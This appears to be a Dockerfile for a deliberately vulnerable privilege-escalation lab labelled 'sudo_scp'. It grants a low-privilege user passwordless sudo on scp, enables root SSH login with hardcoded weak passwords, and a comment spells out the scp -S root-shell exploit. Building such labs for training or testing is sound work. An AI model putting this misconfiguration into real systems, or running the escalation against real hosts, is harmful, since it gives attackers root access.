FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_scp
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/scp as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and openssh-client (which provides scp)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        openssh-client \
        sudo \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify scp is installed
RUN which scp && ls -la /usr/bin/scp

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# scp supports -S flag to specify an alternative ssh program.
# When run as root via sudo, an attacker can craft a script that execs /bin/sh:
#   echo 'exec /bin/sh 0<&2 1>&2' > /tmp/exploit.sh
#   chmod +x /tmp/exploit.sh
#   sudo scp -S /tmp/exploit.sh x x:
# This spawns a root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/scp" > /etc/sudoers.d/scp && \
    chmod 440 /etc/sudoers.d/scp

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]